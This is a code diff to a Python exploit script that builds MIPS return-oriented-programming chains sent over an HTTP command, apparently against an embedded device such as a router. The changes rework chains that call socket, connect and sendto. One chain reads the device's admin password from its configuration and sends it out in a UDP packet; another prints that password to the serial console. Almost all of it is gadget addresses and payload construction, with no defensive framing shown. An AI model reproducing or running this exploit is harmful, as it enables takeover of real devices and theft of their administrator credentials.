@@ -401,6 +401,22 @@ elif args.command == 'http':
         # Padding 
         chain = b'a'*132
 
+        # Useful addresses
+
+        # Used at address 0x8015b398 in connect call so should work
+        sockfd_addr = 0x802ab9c0 - 0x10
+        sockaddr_addr = 0x802ab9c0 - 0x40
+        pwd_buffer = 0x801d3754
+
+        # for our sockaddr struct as we cant send null bytes
+        harcdoded_afinet = 0x800f9528 # port 4900
+
+        # Function address
+        sendto_addr = 0x80128bc4
+        socket_addr = 0x801293d0
+        sleep_addr = 0x8019abac
+        connect_addr = 0x80129028
+
         # Build the ROP chain
         if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
             ## print 'hello'
@@ -481,7 +497,7 @@ elif args.command == 'http':
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
             chain += b'a' * 4
             chain += p32(0xdeadbeef) # ra
-        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network (WIP)
+        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network (doesnt work :( )
             
             """
             // Trying to emulate this
@@ -502,18 +518,6 @@ elif args.command == 'http':
                 return 0;
             }
             """
-            
-            # Useful function addresses
-            socket_addr = 0x801293d0
-            connect_addr = 0x80129028 # 100% connect
-            sleep_addr = 0x8019abac # (Based on this code from github - 0x8011b0bc)
-
-            # Used at address 0x8015b398 in connect call so should work
-            sockfd_addr = 0x802ab9c0 - 100 #0x8025cdfc
-            sockaddr_addr = 0x802ab9c0 - 80 #0x8029a718
-
-            # for our sockaddr struct as we cant send null bytes
-            harcdoded_afinet = 0x800f9528 # port 4900
 
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0xdeadbeef) # s0
@@ -659,17 +663,6 @@ elif args.command == 'http':
             chain += p32(0xdeadbeef) # s2
             chain += p32(0xdeadbeef) # ra
         elif (args.rop[0] == '3'): # send 'hello' over udp socket to some device
-            # Used at address 0x8015b398 in connect call so should work
-            sockfd_addr = 0x802ab9c0 - 100 #0x8025cdfc
-            sockaddr_addr = 0x802ab9c0 - 80 #0x8029a718
-
-            # for our sockaddr struct as we cant send null bytes
-            harcdoded_afinet = 0x800f9528 # port 4900
-
-            # Function address
-            sendto_addr = 0x80128bc4
-            socket_addr = 0x801293d0
-
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0xdeadbeef) # s0
             chain += p32(0xdeadbeef) # s1
@@ -809,17 +802,15 @@ elif args.command == 'http':
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
             chain += p32(sendto_addr) # v0 - sendto address
             chain += b'b' * 8
-            chain += p32(0x15114 + base_address) # ra
+            chain += p32(0x11111111) # ra
 
             # Call sendto and regain control
             # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
             chain += p32(0xdeadbeef)
-        elif (args.rop[0] == '4'): # print the admin password to the uart
-            pwd_buffer = 0x802ab9c0 - 60
-
+        elif (args.rop[0] == '4'): # print the admin password to the uart using config get function
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0x80236c4c-4) # s0 (0x1010200)
+            chain += p32(0x80236c4c - 4) # s0 (0x1010200)
             chain += p32(0xdeadbeef) # s1
             chain += p32(0xdeadbeef) # s2
             chain += p32(0xdeadbeef) # s3
@@ -877,48 +868,12 @@ elif args.command == 'http':
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
             chain += b'a' * 4
             chain += p32(0xdeadbeef) # ra
-        elif (args.rop[0] == '5'): # Send a UDP packet containing the admin password
-            # Used at address 0x8015b398 in connect call so should work
-            sockfd_addr = 0x802ab9c0 - 100
-            sockaddr_addr = 0x802ab9c0 - 80
-            pwd_buffer = 0x802ab9c0 - 40
-
-            # for our sockaddr struct as we cant send null bytes
-            harcdoded_afinet = 0x800f9528 # port 4900
-
-            # Function address
-            sendto_addr = 0x80128bc4
-            socket_addr = 0x801293d0
-
+        elif (args.rop[0] == '5'): # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
             # Add the strings to the sX registers, and set the ra to first gadget
-            chain += p32(0x80236c4c - 4) # s0 (0x1010200)
+            chain += p32(0xdeadbeef) # s0 (0x1010200)
             chain += p32(0xdeadbeef) # s1
             chain += p32(0xdeadbeef) # s2
             chain += p32(0xdeadbeef) # s3
-            chain += p32(0x153d0 + base_address) # ra
-
-            ####################################################
-            ############## config load function ################
-            ####################################################
-
-            # set a0 to be the id of the admin password
-            # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
-            chain += p32(0x800089e4 + 0x7b58) # s0
-            chain += p32(0x11e568 + base_address)
-
-            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
-            chain += p32(pwd_buffer)
-            chain += b'b' * 0x8
-            chain += p32(0x137960 + base_address)
-
-            ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
-            # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0x15114 + base_address) # ra
-
-            ## Now call config load
-            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            chain += b'b' * 0x4
             chain += p32(0x11e670 + base_address) # ra
 
             ####################################################################
@@ -953,14 +908,56 @@ elif args.command == 'http':
             # Call socket(2, 1, 0) and regain control
             # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
             chain += b'b' * 0x18
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(sockaddr_addr) # s1
+            chain += p32(sockfd_addr) # s0
+            chain += p32(0xdeadbeef) # s1
             chain += p32(0xdeadbeef) # s2
-            chain += p32(0x1746c8 + base_address) # ra
+            chain += p32(0x185e38 + base_address) # ra
+
+            # save the socket file descriptor for use later, might not use but oh well
+            # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0x80236c4c - 4) # s0
+            chain += p32(0x153d0 + base_address) # ra
+
+            ####################################################
+            ############## config load function ################
+            ####################################################
+
+            # set a0 to be the id of the admin password
+            # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
+            chain += p32(0x800089e4 + 0x7b58) # s0
+            chain += p32(0x11e568 + base_address)
+
+            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(pwd_buffer)
+            chain += b'b' * 0x8
+            chain += p32(0x137960 + base_address)
+
+            ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
+            # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x15114 + base_address) # ra
+
+            ## Now call config load
+            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            chain += b'b' * 0x4
+            chain += p32(0x1a9f9c + base_address) # ra
 
             ##########################################################################################################################################
             ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
             ##########################################################################################################################################
+
+            # Load sockfd into v0
+            # 0x001a9f9c: lw $v0, ($sp); lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
+            chain += p32(sockfd_addr) # v0
+            chain += b'b' * 8
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(sockaddr_addr) # s1
+            chain += p32(0x1a46dc + base_address) # ra
+
+            # Load hardcoded afinet stuff into v0 (currently has the address)
+            # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
+            chain += b'b' * 4
+            chain += p32(0x1746c8 + base_address)
 
             # Move sockfd to a0 for connect
             # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
@@ -971,17 +968,17 @@ elif args.command == 'http':
             # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
             chain += p32(pwd_buffer) # a1 (address of hello)
             chain += b'b' * 0x8
-            chain += p32(0x100790 + base_address)
+            chain += p32(0x100790 + base_address) # ra
 
             # Set a2 to be the length of the string 'hello\0' 
             # 0x00100790: addiu $a2, $zero, 6; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 0x4
-            chain += p32(0xbb6e4 + base_address)        
+            chain += p32(0xbb6e4 + base_address) # ra
 
             # Set a3 to be zero (flags)
             # 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
             chain += b'b' * 0xc
-            chain += p32(0x57864 + base_address)
+            chain += p32(0x57864 + base_address) # ra
 
             ## Set up sockaddr struct
 
@@ -989,12 +986,12 @@ elif args.command == 'http':
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
             chain += p32(harcdoded_afinet) # v0
             chain += b'b' * 8
-            chain += p32(0x1a46dc + base_address)
+            chain += p32(0x1a46dc + base_address) # ra
 
             # Load hardcoded afinet stuff into v0 (currently has the address)
             # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
-            chain += p32(0x13e134 + base_address)
+            chain += p32(0x13e134 + base_address) # ra
 
             # Store the afinet stuff at our sockaddr struct
             # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
@@ -1058,7 +1055,7 @@ elif args.command == 'http':
             # Call sendto and regain control
             # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef)
+            chain += p32(0xdeadb33f) # ra
         else:
             print("[-] Bad type")
             exit(1)
